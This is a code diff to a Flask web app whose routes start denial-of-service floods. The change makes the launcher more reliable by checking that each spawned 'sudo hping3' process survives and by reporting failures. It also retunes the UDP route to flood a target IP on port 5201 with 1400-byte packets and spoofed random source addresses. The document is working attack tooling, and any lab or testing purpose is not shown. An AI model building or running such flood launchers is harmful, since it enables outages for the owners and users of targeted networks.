@@ -3,6 +3,7 @@ import subprocess
 import os
 import signal
 import logging
+import time
 
 app = Flask(__name__)
 
@@ -37,6 +38,7 @@ def start_attack_processes(attack_type, command, count=5):
 
         # Start new processes
         pids = []
+        failures = 0
         for i in range(count):
             process = subprocess.Popen(
                 command,
@@ -45,14 +47,31 @@ def start_attack_processes(attack_type, command, count=5):
                 stderr=subprocess.DEVNULL,
                 preexec_fn=os.setpgrp  # Create new process group
             )
-            pids.append(process.pid)
-            logger.info(f"Started {attack_type} attack process {i+1}/{count} with PID {process.pid}")
+            time.sleep(0.1)
+            # Check if the process exited immediately
+            if process.poll() is not None:
+                logger.error(f"hping3 {attack_type} process {i+1} exited immediately with code {process.returncode}")
+                failures += 1
+            else:
+                pids.append(process.pid)
+                logger.info(f"Started {attack_type} attack process {i+1}/{count} with PID {process.pid}")
 
         active_attacks[attack_type] = pids
 
+        if len(pids) == 0:
+            return {
+                "status": "error",
+                "message": f"All {attack_type.upper()} hping3 processes exited immediately! Sudo rights? hping3 installed and accessible?",
+                "pids": []
+            }
+
+        msg = f"{attack_type.upper()} attack started with {len(pids)} processes"
+        if failures > 0:
+            msg += f" ({failures} processes failed to start or exited immediately)"
+
         return {
-            "status": "success",
-            "message": f"{attack_type.upper()} attack started with {count} processes",
+            "status": "success" if len(pids) > 0 else "error",
+            "message": msg,
             "pids": pids
         }
     except Exception as e:
@@ -124,8 +143,9 @@ def start_icmp_attack():
 
 @app.route('/attack/udp/start')
 def start_udp_attack():
-    """Start UDP flood attack with 5 processes."""
-    command = f"sudo hping3 --udp --flood --rand-source --rand-dest {TARGET_IP}"
+    """Start UDP flood attack with 5 processes, big packets, to port 5201."""
+    # DO NOT use --rand-dest. Use -p 5201 --data 1400, as in your manual test
+    command = f"sudo hping3 --udp --flood --rand-source -p 5201 --data 1400 {TARGET_IP}"
     result = start_attack_processes("udp", command, 5)
     logger.info(f"UDP attack start: {result}")
     return jsonify(result), 200 if result["status"] == "success" else 500
